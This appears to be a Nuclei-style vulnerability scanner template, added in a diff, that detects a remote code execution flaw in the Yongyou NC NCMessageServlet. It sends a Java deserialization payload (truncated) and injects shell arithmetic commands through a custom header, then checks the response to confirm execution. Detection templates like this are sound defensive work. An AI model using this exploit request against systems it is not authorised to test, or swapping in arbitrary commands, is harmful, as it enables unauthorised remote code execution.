@@ -1,0 +1,51 @@
+id: yongyou-nc-ncmessageservlet-rce
+info:
+  name: Yongyou NCMessageServlet RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects potential Remote Code Execution vulnerability in Yongyou NCMessageServlet by evaluating responses with calculated headers and base64 values.
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=92
+variables:
+  rInt1: "{{rand_int(800000000, 1000000000)}}"
+  rInt2: "{{rand_int(800000000, 1000000000)}}"
+  rb: |
+    "{{hex_decode('aced0005737200116a6176612e7574696c2e486173684d6170...')}}"  # Shortened for brevity.
+http:
+  - raw:
+      - |
+        POST /servlet/~baseapp/nc.message.bs.NCMessageServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+        X-T0KEN-INF0: set /A {{rInt1}}+{{rInt2}}
+
+        {{rb}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-T0KEN"
+      - type: regex
+        part: header
+        regex:
+          - "{{base64(to_number(rInt1)+to_number(rInt2))}}"
+  - raw:
+      - |
+        POST /servlet/~baseapp/nc.message.bs.NCMessageServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+        X-T0KEN-INF0: expr {{rInt1}}+{{rInt2}}
+
+        {{rb}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-T0KEN"
+      - type: regex
+        part: header
+        regex:
+          - "{{base64(to_number(rInt1)+to_number(rInt2))}}"
